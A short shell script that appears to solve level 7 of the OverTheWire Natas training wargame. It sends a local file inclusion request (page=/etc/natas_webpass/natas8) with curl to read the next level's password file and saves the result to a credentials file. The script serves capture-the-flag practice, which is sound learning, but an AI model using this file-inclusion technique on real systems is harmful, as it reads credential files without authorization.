#!/bin/sh

level="natas7"
url="http://$level.natas.labs.overthewire.org"
web_auth=$(grep ^$level credentials)

echo -n "[i] Target: $url\n"
next_password=$(curl -u $web_auth -sL $url/index.php?page=/etc/natas_webpass/natas8 2>&1 | grep -v "^<" | tr -d "\n")
echo -n "[+] Password for the next level: $next_password"
echo "natas8:$next_password" >> ./credentials
